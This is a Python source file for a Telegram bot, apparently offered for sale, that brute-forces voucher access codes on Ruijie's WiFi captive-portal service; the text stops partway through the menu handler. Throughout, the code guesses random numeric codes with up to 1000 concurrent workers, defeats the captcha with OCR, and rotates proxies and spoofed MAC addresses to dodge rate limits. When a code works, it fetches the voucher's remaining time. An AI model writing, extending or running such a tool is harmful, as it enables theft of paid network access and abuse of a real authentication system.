import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import hashlib
import datetime
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from aiohttp_socks import ProxyConnector, ProxyType

GITHUB_OWNER = 'GuNge2008'
GITHUB_REPO = 'KEY'
FILE_PATH = 'key.txt'
GITHUB_TOKEN = '******'
LAST_RUN_FILE = 'last_run.txt'

bcyan = '\x1b[1;36m'
bgreen = '\x1b[1;32m'
bred = '\x1b[1;31m'
yellow = '\x1b[33m'
white = '\x1b[37m'
reset = '\x1b[0m'


def show_banner():
    try:
        if os.name == 'posix' and os.environ.get('TERM'):
            os.system('clear')
        elif os.name == 'nt':
            os.system('cls')
    except Exception:
        pass
    print(bcyan + '=' * 58 + reset)
    print(bcyan + '   ⚡ RUIJIE  ASYNC EXTREME  ⚡   ' + reset)
    print('        Telegram @ravenboii     ')
    print(bcyan + '=' * 58 + reset)


def get_system_key():
    return '8776761081'


def encrypt_key_data(key_str: str, expiry_str: str):
    combined = f'{key_str}|{expiry_str}'
    return hashlib.sha256(combined.encode()).hexdigest()


def check_time_integrity():
    now = datetime.datetime.now()
    if not os.path.exists(LAST_RUN_FILE):
        with open(LAST_RUN_FILE, 'w') as f:
            f.write(now.strftime('%Y-%m-%d %H:%M:%S'))
        return
    try:
        with open(LAST_RUN_FILE, 'r') as f:
            last_run_time = datetime.datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
        if now < last_run_time:
            print(bred + '[!] ERROR: TIME ROLLBACK DETECTED! STOPPING...' + reset + '\n')
            os._exit(0)
    except Exception:
        with open(LAST_RUN_FILE, 'w') as f:
            f.write(now.strftime('%Y-%m-%d %H:%M:%S'))
    with open(LAST_RUN_FILE, 'w') as f:
        f.write(now.strftime('%Y-%m-%d %H:%M:%S'))


def display_remaining_time(expiry_date):
    now = datetime.datetime.now()
    remaining = expiry_date - now
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    time_str = f"{'' if days else ''}{days} days {hours} hour {minutes} min "
    print(bgreen + '[+] Access Granted!' + reset)
    print(yellow + '[*] Time left: ' + time_str +
          f"\n[-] Expired on ({expiry_date.strftime('%Y-%m-%d %H:%M')}) " + reset)
    print('==========================================================')


def check_approval():
    return True


TIMEOUT_SEC = 15
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 1000
TARGET_SIDS = 50
SID_TTL = 120              # seconds a sessionId stays in the pool before it is refreshed
DIRECT = 'direct'          # sentinel: use the sandbox IP directly (no proxy)
DIRECT_SLOTS = 10          # how many direct-connection slots to add to the pool
ADMIN_IDS = [8511509070]
BOT_TOKEN = '8******)
PORTAL_URL_PATH = 'portal_url_'
PROXY_FILE = 'proxies.txt'


class ProxyManager:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.cooldown = {}          # proxy -> expiry timestamp (rate-limited)
        self.index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str) -> 'str | None':
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return 'http://' + proxy
        return proxy

    def load(self):
        try:
            if os.path.exists(self.file_path):
                with open(self.file_path, 'r') as f:
                    raw = f.read()
                self.proxies.clear()
                self.bad_proxies.clear()
                self.index = 0
                self.proxies.extend(self._normalize(r) for r in raw.splitlines() if r.strip())
                # Add direct-connection slots (sandbox IP, no proxy).
                self.proxies.extend([DIRECT] * DIRECT_SLOTS)
                print(f'[ProxyManager] Loaded {len(self.proxies)} endpoints ({DIRECT_SLOTS} direct)')
        except Exception as e:
            print(f'[ProxyManager] Load error: {e}')

    def reload(self):
        self.load()

    async def get_next(self) -> 'str | None':
        # Lock-free: single-threaded event loop, int increment is atomic.
        now = time.time()
        available = [p for p in self.proxies
                     if p not in self.bad_proxies and self.cooldown.get(p, 0) <= now]
        if not available:
            return None
        proxy = available[self.index % len(available)]
        self.index += 1
        return proxy

    async def mark_limited(self, proxy: str, seconds: float = 30.0):
        if proxy == DIRECT:
            return
        async with self.lock:
            self.cooldown[proxy] = time.time() + seconds

    async def mark_bad(self, proxy: str):
        async with self.lock:
            self.bad_proxies.add(proxy)

    async def reset(self):
        """Restore every proxy to its original (normal) state."""
        async with self.lock:
            self.bad_proxies.clear()
            self.cooldown.clear()
            self.index = 0

    def stats(self) -> 'tuple[int, int]':
        total = len(self.proxies)
        now = time.time()
        active = sum(1 for p in self.proxies
                     if p not in self.bad_proxies and self.cooldown.get(p, 0) <= now)
        return total, active


_proxy_manager = None


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


_ocr_instance = None


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


user_scanners = {}


def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        if os.path.exists(FILE_PATH):
            with open(FILE_PATH, 'r') as f:
                for line in f.read().strip().splitlines():
                    if line.startswith(PORTAL_URL_PATH + str(user_id) + ' '):
                        saved_url = line.split(' ', 1)[1].strip()
                        break
        user_scanners[user_id] = {
            'mode': 'num6',
            'char_set': '012345678',
            'code_len': 6,
            'start_digit': None,
            'end_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'stats': {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()},
            'valid_codes': [],
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'recheck_queue': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'dash_task': None,
            'tasks': [],
            'menu_msg_id': None,
            'state': None,
            'sid_pool': [],
            'sid_time': {},
            'sid_auth': {},
            'sid_lock': asyncio.Lock(),
        }
    return user_scanners[user_id]


def generate_random_mac():
    return ':'.join('%02x' % random.randint(0, 255) for _ in range(6))


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    ocr = get_ocr_instance()
    result = ocr.classification(image_bytes)
    return result.strip().upper()


async def solve_captcha_simple_async(session, captcha_url, headers):
    current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
    async with session.get(current_url, headers=headers, ssl=False,
                           timeout=aiohttp.ClientTimeout(total=10)) as response:
        if response.status == 200:
            image_content = await response.read()
            # Run CPU-bound OCR in a worker thread so it does NOT block the event loop.
            return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
        return ''


async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}

    # 1) If the URL already carries a sessionId, use it directly.
    existing = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
    if existing:
        return existing

    # 2) Try the URL as-is and with a spoofed mac, following redirects.
    u = urlparse(portal_url)
    mac = generate_random_mac()
    query = parse_qs(u.query)
    query['mac'] = [mac]
    spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

    for url in (spoofed_url, portal_url):
        try:
            async with session.get(url, headers=headers, timeout=TIMEOUT_SEC, ssl=False, allow_redirects=True) as r:
                sid = parse_qs(urlparse(str(r.url)).query).get('sessionId', [None])[0]
                if sid:
                    return sid
                body = await r.text()
                m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{6,})', body)
                if m:
                    return m.group(1)
                for pat in (
                    r"location\.href\s*=\s*['\"]([^'\"]+)['\"]",
                    r"location\.replace\s*\(\s*['\"]([^'\"]+)['\"]",
                    r"window\.location\s*=\s*['\"]([^'\"]+)['\"]",
                    r"<meta[^>]+http-equiv=['\"]refresh['\"][^>]+url=([^'\">]+)",
                ):
                    mm = re.search(pat, body, re.I)
                    if mm:
                        target = urljoin(url, mm.group(1).strip())
                        sid = parse_qs(urlparse(target).query).get('sessionId', [None])[0]
                        if sid:
                            return sid
                        async with session.get(target, headers=headers, timeout=TIMEOUT_SEC, ssl=False, allow_redirects=True) as r2:
                            sid = parse_qs(urlparse(str(r2.url)).query).get('sessionId', [None])[0]
                            if sid:
                                return sid
        except Exception as e:
            ud['recent_logs'].append(f"⚠️ SID err: {type(e).__name__}")
    ud['recent_logs'].append("⚠️ SID: no sessionId found — check Portal URL")
    return None


def create_connector_for_proxy(proxy: str):
    if proxy and proxy != DIRECT:
        return ProxyConnector.from_url(proxy, ssl=False)
    return None


async def fetch_balance(logon_url: str, code: str, proxy: str, orig_sid: str = None) -> str:
    # The balance endpoint takes the authenticated sessionId (from logonUrl), not the code.
    candidates = []
    if logon_url:
        m = re.search(r'sessionId=([^&\s]+)', logon_url)
        if m:
            candidates.append(m.group(1))
    if orig_sid and orig_sid not in candidates:
        candidates.append(orig_sid)
    if not candidates:
        candidates.append(code)
    connector = create_connector_for_proxy(proxy)
    async with aiohttp.ClientSession(connector=connector) as s:
        last = ''
        for target in candidates:
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json;',
                'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={target}&lang=en_US',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                'authority': 'portal-as.ruijienetworks.com',
            }
            url = 'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/' + target
            try:
                async with s.get(url, headers=headers, timeout=10) as resp:
                    if resp.status != 200:
                        last = f"\u274c HTTP {resp.status}"
                        continue
                    try:
                        data = await resp.json()
                    except Exception:
                        last = "\u274c bad json"
                        continue
                    inner = data.get('result')
                    if inner is None:
                        last = f"\u274c {str(data.get('message'))[:40]}"
                        continue
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    total_minutes = int(raw_total) if raw_total else 0
                    hours, minutes = divmod(total_minutes, 60)
                    return f"\U0001f525: {profile_name}, \u23f0: {hours} hr {minutes} min"
            except Exception as e:
                last = f"\u274c {type(e).__name__}"
        return last
    return ''


async def check_balance(logon_url, code, user_id, proxy_str, orig_sid=None):
    ud = get_user_data(user_id)
    balance_str = await fetch_balance(logon_url, code, proxy_str, orig_sid)
    for item in ud['valid_codes']:
        if item['code'] == code:
            item['balance_str'] = balance_str
            break
    return balance_str


async def check_single_access_code(session, code, current_session_id, login_url, captcha_base_url, verify_url, headers, user_id, current_proxy, auth_code=None):
    """Correct Ruijie voucher flow (reverse-engineered from voucherLogin.js):
       1) POST /api/auth/voucher/  {accessCode, sessionId, apiVersion:1, [authCode]}
       2) If response.object.checkCaptcha -> solve captcha ONCE, POST /api/auth/captcha/verify
          {sessionId, authCode}, then REUSE that authCode for subsequent attempts.
       3) Success when response.success == 1 and response.result.authResult == "1".
       Returns the (possibly new) verified authCode so the worker can cache it.
    """
    ud = get_user_data(user_id)

    async def submit(ac=None):
        payload = {'accessCode': code, 'sessionId': current_session_id, 'apiVersion': 1}
        if ac:
            payload['authCode'] = ac
        async with session.post(login_url, json=payload, headers=headers, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
            try:
                return await resp.json()
            except Exception:
                # Rate-limit / error pages are HTML, not JSON.
                try:
                    txt = await resp.text()
                except Exception:
                    txt = ''
                if 'limit' in txt.lower():
                    return {'__ratelimited__': True}
                return {}

    def handle(data):
        if not isinstance(data, dict) or not data:
            # No real response (timeout / dead proxy) -> do not count as a check.
            return {'status': 'failed', 'code': code}
        if data.get('__ratelimited__'):
            ud['stats']['limits'] += 1
            return {'status': 'limit', 'code': code}
        success = data.get('success')
        if success == 1 or success is True:
            result = data.get('result') or {}
            if str(result.get('authResult')) == '1':
                ud['stats']['hits'] += 1
                hit = {'code': code, 'balance_str': '...fetching...'}
                ud['valid_codes'].append(hit)
                ud['dash_update_event'].set()
                logon = result.get('logonUrl', '') or ''
                asyncio.create_task(check_balance(logon, code, user_id, current_proxy, current_session_id))
                return {'status': 'hit', 'code': code}
            ud['stats']['expired'] += 1
            return {'status': 'expired', 'code': code}
        obj = data.get('object') or {}
        if obj.get('checkCaptcha'):
            return {'status': 'captcha', 'code': code}
        msg = str(data.get('message', '')).lower()
        if 'limit' in msg or 'exceed' in msg or 'max' in msg or 'limited' in msg:
            ud['stats']['limits'] += 1
            ud['limit_codes'].append(code)
            return {'status': 'limit', 'code': code}
        ud['stats']['tried'] += 1
        return {'status': 'failed', 'code': code}

    # First attempt: reuse the cached verified authCode if we already have one.
    try:
        data = await submit(auth_code)
    except Exception:
        return {'status': 'failed', 'code': code}

    res = handle(data)
    if res['status'] != 'captcha':
        res['auth_code'] = auth_code
        return res

    # Captcha required -> solve ONCE, verify, then reuse for subsequent attempts.
    captcha_url = captcha_base_url + '?sessionId=' + current_session_id
    for _ in range(3):
        new_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not new_code:
            continue
        try:
            async with session.post(verify_url, json={'sessionId': current_session_id, 'authCode': new_code},
                                    headers=headers, ssl=False,
                                    timeout=aiohttp.ClientTimeout(total=10)) as v_resp:
                v_data = await v_resp.json()
        except Exception:
            v_data = {}
        if not (isinstance(v_data, dict) and v_data.get('success')):
            continue
        try:
            data2 = await submit(new_code)
        except Exception:
            continue
        res2 = handle(data2)
        if res2['status'] != 'captcha':
            res2['auth_code'] = new_code
            return res2
    ud['stats']['tried'] += 1
    return {'status': 'failed', 'code': code, 'auth_code': auth_code}


async def proxy_health_check(user_id, once=False):
    """Ping the portal through every proxy; mark dead ones bad and revive good ones.
    Runs once at scan start, then periodically to catch proxies dying/reviving."""
    pm = get_proxy_manager()
    ud = get_user_data(user_id)
    ping_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId=healthcheck'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/148.0.0.0 Mobile Safari/537.36'}

    async def check(p):
        if p == DIRECT:
            return (p, True)
        try:
            conn = ProxyConnector.from_url(p, ssl=False)
            async with aiohttp.ClientSession(connector=conn) as s:
                async with s.get(ping_url, headers=headers, timeout=6, ssl=False) as r:
                    await r.read()
                    return (p, True)
        except Exception:
            return (p, False)

    while True:
        proxies = list(pm.proxies)
        if proxies:
            results = await asyncio.gather(*[check(p) for p in proxies])
            async with pm.lock:
                for p, ok in results:
                    if ok:
                        pm.bad_proxies.discard(p)
                    else:
                        pm.bad_proxies.add(p)
        if once or ud['stop_event'].is_set():
            return
        await asyncio.sleep(60)


async def sid_refresher(context, user_id):
    """Keep a shared pool of valid sessionIds filled, each pre-verified (captcha cleared).
    sessionIds are IP-independent (verified), so all workers can share them."""
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
               'Content-Type': 'application/json',
               'Origin': 'https://portal-as.ruijienetworks.com',
               'Referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html'}
    captcha_base_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/image'
    verify_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/verify'

    async def make_sid():
        # Try a couple of different proxies so one dead proxy doesn't stall the pool.
        for _attempt in range(3):
            proxy = await pm.get_next()
            if not proxy:
                return
            session = aiohttp.ClientSession(connector=create_connector_for_proxy(proxy), connector_owner=True)
            try:
                sid = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                if not sid:
                    continue
                # Pre-warm the captcha so workers never need to solve it.
                auth = None
                captcha_url = captcha_base_url + '?sessionId=' + sid
                for _ in range(3):
                    code = await solve_captcha_simple_async(session, captcha_url, headers)
                    if not code:
                        continue
                    try:
                        async with session.post(verify_url, json={'sessionId': sid, 'authCode': code},
                                                headers=headers, ssl=False) as vr:
                            vd = await vr.json()
                    except Exception:
                        vd = {}
                    if isinstance(vd, dict) and vd.get('success'):
                        auth = code
                        break
                async with ud['sid_lock']:
                    if sid not in ud['sid_pool']:
                        ud['sid_pool'].append(sid)
                        ud['sid_time'][sid] = time.time()
                    if auth:
                        ud['sid_auth'][sid] = auth
                return
            finally:
                try:
                    await session.close()
                except Exception:
                    pass

    while not ud['stop_event'].is_set():
        try:
            if ud['portal_url'] is None:
                await asyncio.sleep(0.5)
                continue
            now = time.time()
            async with ud['sid_lock']:
                # Prune expired sessionIds so fresh ones keep flowing in.
                fresh = []
                for s in ud['sid_pool']:
                    if now - ud['sid_time'].get(s, 0) < SID_TTL:
                        fresh.append(s)
                    else:
                        ud['sid_auth'].pop(s, None)
                        ud['sid_time'].pop(s, None)
                ud['sid_pool'] = fresh
                need = TARGET_SIDS - len(ud['sid_pool'])
            if need <= 0:
                await asyncio.sleep(0.3)
                continue
            batch = min(need, 25)
            await asyncio.gather(*[make_sid() for _ in range(batch)])
        except Exception:
            await asyncio.sleep(0.3)
    return


async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    session = None
    proxy = None
    while not ud['stop_event'].is_set():
        # (Re)acquire a proxy + a persistent session (avoids connection churn).
        if session is None:
            proxy = await pm.get_next()
            if not proxy:
                await asyncio.sleep(0.3)
                continue
            session = aiohttp.ClientSession(connector=create_connector_for_proxy(proxy), connector_owner=True)
        pool = ud['sid_pool']
        sid = random.choice(pool) if pool else None
        if not sid:
            await asyncio.sleep(0.2)
            continue
        auth_code = ud['sid_auth'].get(sid)
        mode = ud['mode']
        if mode == 'custom' and ud['start_digit']:
            code = ud['start_digit'] + ''.join(random.choices(ud['char_set'], k=ud['code_len'] - 1))
        elif mode == 'customend' and ud.get('end_digit'):
            code = ''.join(random.choices(ud['char_set'], k=ud['code_len'] - 1)) + ud['end_digit']
        else:
            code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
        if code in ud['tried_codes']:
            continue
        ud['tried_codes'].add(code)
        ud['CURRENT_CODE'] = code
        try:
            result = await check_single_access_code(session, code, sid, login_url, captcha_base_url, verify_url, headers, user_id, proxy, auth_code)
        except Exception:
            result = {'status': 'failed', 'code': code}
        if result.get('auth_code'):
            ud['sid_auth'][sid] = result['auth_code']
        if result['status'] == 'hit':
            ud['recent_logs'].append(f"\u2705 HIT: {code} | " + str(next((item.get('balance_str', ' ') for item in ud['valid_codes'] if item['code'] == code), ' ')))
        elif result['status'] == 'limit':
            # This IP is rate-limited: cool it down and rotate to another IP.
            await pm.mark_limited(proxy, 30.0)
            try:
                await session.close()
            except Exception:
                pass
            session = None
            proxy = None
    if session is not None:
        try:
            await session.close()
        except Exception:
            pass
    return


async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.5)
            continue
        stats = ud['stats']
        elapsed = max(time.time() - stats['start_time'], 0) or 1
        speed_cpm = stats['tried'] * 60 / elapsed
        proxy_total, proxy_active = pm.stats()
        hit_list = []
        for item in ud['valid_codes']:
            c = item['code']
            balance = item.get('balance_str', '...fetching...')
            hit_list.append(f'{c} {balance}')
        hit_str = ('\n━━━━━━━━━━━━━━━━━━\n🔥 **Hit Codes**:\n' + '\n'.join(hit_list)) if hit_list else 'None yet'
        text = (f"⚡ Scanner Running ⚡\nThank for using By Telegram @KyiLae2006224"
                f"\n━━━━━━━━━━━━━━━━━━\n🏹 Tried: {stats['tried']}"
                f"\n🎯 Current Code: {ud['CURRENT_CODE']}"
                f"\n⚔️ Expired: {stats['expired']}"
                f"\n🔥 Hits: {stats['hits']}"
                f"\n⚠️ Limits: {stats['limits']}"
                f"\n⚡ Speed: {speed_cpm:.1f} c/m\n🔀 Proxies: {proxy_total}/{proxy_active}"
                + hit_str)
        last_log = ud['recent_logs'][-1] if ud['recent_logs'] else 'None'
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton('🛑 Stop', callback_data='stop_scan')]])
        try:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud['dash_msg_id'],
                text=text + '\n🔄 Last: ' + (last_log or 'None'),
                reply_markup=keyboard)
        except Exception:
            pass
        ud['dash_update_event'].clear()
        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=10.0)
        except asyncio.TimeoutError:
            pass
        await asyncio.sleep(0.5)
    return


async def stop_user_scanner(user_id: int):
    """Fully stop a running scan: signal stop, cancel every child task,
    cancel the dashboard updater, and restore all proxies to normal."""
    ud = get_user_data(user_id)
    ud['stop_event'].set()
    ud['dash_update_event'].set()
    # Cancel every worker / refresher / health-check task.
    for tk in list(ud.get('tasks', [])):
        if tk and not tk.done():
            tk.cancel()
    ud['tasks'] = []
    # Cancel the dashboard updater.
    if ud.get('dash_task') and not ud['dash_task'].done():
        ud['dash_task'].cancel()
    # Cancel the main scanner task.
    if ud.get('task') and not ud['task'].done():
        ud['task'].cancel()
    # Give cancelled tasks a moment to unwind.
    await asyncio.sleep(0.3)
    # Clear the dashboard message id so the next scan creates a fresh bar.
    ud['dash_msg_id'] = None
    # Restore proxies to their original (normal) state.
    try:
        await get_proxy_manager().reset()
    except Exception:
        pass


async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    login_url = 'https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US'
    captcha_base_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/image'
    verify_url = 'https://portal-as.ruijienetworks.com/api/auth/captcha/verify'
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
               'Content-Type': 'application/json',
               'Origin': 'https://portal-as.ruijienetworks.com',
               'Referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html'}
    ud['stop_event'].clear()
    ud['task'] = asyncio.current_task()
    ud['stats'] = {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'start_time': time.time()}
    ud['dash_update_event'].clear()
    # Fully reset ALL previous-scan state so a new scan starts completely clean.
    ud['valid_codes'] = []
    ud['limit_codes'] = []
    ud['tried_codes'] = set()
    ud['recent_logs'] = []
    ud['recheck_queue'] = []
    ud['CURRENT_CODE'] = '----'
    # Reset the shared sessionId pool for a fresh scan.
    async with ud['sid_lock']:
        ud['sid_pool'] = []
        ud['sid_auth'] = {}
        ud['sid_time'] = {}
    if proxy_total == 0:
        await context.bot.send_message(chat_id=user_id, text='⚠️ **No proxies loaded!**\n\n', parse_mode=ParseMode.MARKDOWN)
        return
    # Always start a FRESH dashboard message for each new scan, so the new
    # progress bar appears at the bottom instead of editing the old one.
    # Cancel any previous dashboard updater first to avoid it touching the new msg.
    if ud.get('dash_task') and not ud['dash_task'].done():
        ud['dash_task'].cancel()
    ud['dash_msg_id'] = None
    msg = await context.bot.send_message(
        chat_id=user_id,
        text='🔄 Initializing scanner dashboard...',
        parse_mode=ParseMode.MARKDOWN)
    ud['dash_msg_id'] = msg.message_id
    ud['dash_task'] = asyncio.create_task(live_dashboard_updater(context, user_id))
    # Health-check all proxies once so workers only use live ones.
    try:
        await proxy_health_check(user_id, once=True)
    except Exception:
        pass
    tasks = []
    # Periodic proxy health checker (revives recovered proxies, bans dead ones).
    tasks.append(asyncio.create_task(proxy_health_check(user_id)))
    # Shared sessionId pool refresher: keeps TARGET_SIDS valid sessionIds ready.
    tasks.append(asyncio.create_task(sid_refresher(context, user_id)))
    worker_count = NUM_WORKERS
    for i in range(worker_count):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    ud['tasks'] = tasks
    await asyncio.gather(*tasks, return_exceptions=True)
    ud['tasks'] = []
    ud['stop_event'].set()
    ud['dash_update_event'].set()
    stats = ud['stats']
    elapsed = max(time.time() - stats['start_time'], 0) or 1
    speed_cpm = stats['tried'] * 60 / elapsed
    hit_list = []
    for item in ud['valid_codes']:
        c = item['code']
        balance = item.get('balance_str', '...fetching...')
        hit_list.append(f'{c} {balance}')
    final_text = (f"🛑 Scanner Stopped/Finished\n━━━━━━━━━━━━━━━━━━\n🔋 Total Tried: {stats['tried']}"
                  f"\n🟢 Hits: {stats['hits']}"
                  f"\n⚡ Final Speed: {speed_cpm:.1f} c/m\n🔀 Proxies: {proxy_total}/{proxy_active}"
                  f"\n━━━━━━━━━━━━━━━━━━\n📋 **All Hit Codes**:\n" +
                  (('\n'.join(hit_list) + '\n') if hit_list else 'None\n'))
    if ud['dash_msg_id']:
        try:
            await context.bot.edit_message_text(chat_id=user_id, message_id=ud['dash_msg_id'], text=final_text)
        except Exception:
            await context.bot.send_message(chat_id=user_id, text=final_text)
    else:
        await context.bot.send_message(chat_id=user_id, text=final_text)
    return


async def test_portal(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    if not ud['portal_url']:
        await context.bot.send_message(chat_id=user_id, text='❌ Portal URL not set. Use Update Portal first.')
        return
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36'}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(ud['portal_url'], headers=headers, timeout=20, ssl=False, allow_redirects=True) as r:
                body = await r.text()
                sid = parse_qs(urlparse(str(r.url)).query).get('sessionId', [None])[0]
                m = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{6,})', body)
                found = sid or (m.group(1) if m else None)
                msg = (f"🔍 **Portal Test**\n"
                       f"HTTP: `{r.status}`\n"
                       f"Final URL: `{str(r.url)[:90]}`\n"
                       f"sessionId: `{found or 'NOT FOUND'}`\n"
                       f"Body size: `{len(body)}`\n\n"
                       f"➡️ If sessionId is NOT FOUND, the Portal URL is wrong.\n"
                       f"Use the URL your browser lands on AFTER the WiFi login page loads (it must contain `sessionId=`).")
                await context.bot.send_message(chat_id=user_id, text=msg, parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await context.bot.send_message(chat_id=user_id, text=f'❌ Test failed: {type(e).__name__}: {e}')


def get_main_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('🌐 Update Portal', callback_data='btn_update_portal')],
        [InlineKeyboardButton('🔍 Test Portal', callback_data='btn_test_portal')],
        [InlineKeyboardButton('➕ Add Proxies', callback_data='btn_add_proxies')],
        [InlineKeyboardButton('🚀 Start Scanner', callback_data='btn_start_scanner')],
        [InlineKeyboardButton('⚙️ Mode', callback_data='btn_mode_menu')],
    ])


def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.effective_message.reply_text('⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ။ အသုံးပြုချင်ပါက telegram @KyiLae2006224 ဝယ်ယူပါရန်')
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


@admin_only
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    msg = await update.message.reply_text(
        f"⚡ **Starlink Scanner Control Panel** ⚡\n\n⚙️ Current Mode: `{ud['mode']}`\n🔀 Proxies: `{proxy_total}/{proxy_active}`",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_menu_markup())
    ud['menu_msg_id'] = msg.message_id
    return


@admin_only
async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    ud['state'] = 'waiting_for_proxy_text'
    await update.message.reply_text('📥 **Proxy များကို ယခုပို့ပါ**\n', parse_mode=ParseMode.MARKDOWN)
    ud['menu_msg_id'] = update.message.message_id
    return


@admin_only
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    data = query.data

    if data == 'btn_update_portal':
        ud['state'] = 'waiting_for_portal_url'
        await query.message.edit_text(
            '🌐 **Portal URL ကို ပို့ပေးပါ။**\n\n'
            '⚠️ အရေးကြီး — URL မှာ `sessionId=` ပါရမယ်။\n'
            'WiFi login page ပေါ်လာပြီးနောက် browser ရဲ့ URL ကို copy လုပ်ပါ။\n'
            'ဥပမာ - `.../index.html?sessionId=xxxx&prefix=...`\n\n'
            'မှန်/မမှန် စစ်ဖို့ 🔍 Test Portal ကို နှိပ်ပါ။')
        ud['menu_msg_id'] = query.message.message_id

    elif data == 'btn_test_portal':
        await test_portal(context, user_id)

    elif data == 'btn_mode_menu':
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton('Num 6', callback_data='set_mode_num6'),
             InlineKeyboardButton('Num 7', callback_data='set_mode_num7'),
             InlineKeyboardButton('Num 8', callback_data='set_mode_num8'),
             InlineKeyboardButton('Num 9', callback_data='set_mode_num9')],
